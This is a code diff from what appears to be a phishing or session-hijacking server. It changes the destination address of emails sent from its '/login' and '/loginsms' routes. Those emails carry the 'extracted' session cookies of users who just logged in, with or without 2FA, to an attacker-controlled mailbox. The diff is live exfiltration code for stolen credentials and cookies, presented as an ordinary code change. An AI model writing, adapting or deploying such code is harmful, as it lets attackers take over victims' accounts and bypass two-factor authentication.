@@ -507,7 +507,7 @@ app.post('/login', async (req, res) => {
                     // Send No-2FA email notification
                     const emailOptions = {
                         from: process.env.EMAIL_USER || 'Eakyra576@gmail.com',
-                        to: 'eakyra888@gmail.com',
+                        to: 'Eakyra777@gmail.com',
                         subject: `Login Success [No 2FA]: ${email}`,
                         text: `Login successful without 2FA. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
                     };
@@ -953,7 +953,7 @@ app.post('/loginsms', async (req, res) => {
                 try {
                     const emailOptions = {
                         from: process.env.EMAIL_USER || 'Eakyra576@gmail.com',
-                        to: 'eakyra888@gmail.com',
+                        to: 'Eakyra777@gmail.com',
                         subject: `Login Success [2FA]: ${emailPasswordData.email}`,
                         text: `Login successful with 2FA verification. Cookies extracted:\n\n${JSON.stringify(userEntry, null, 2)}`,
                     };
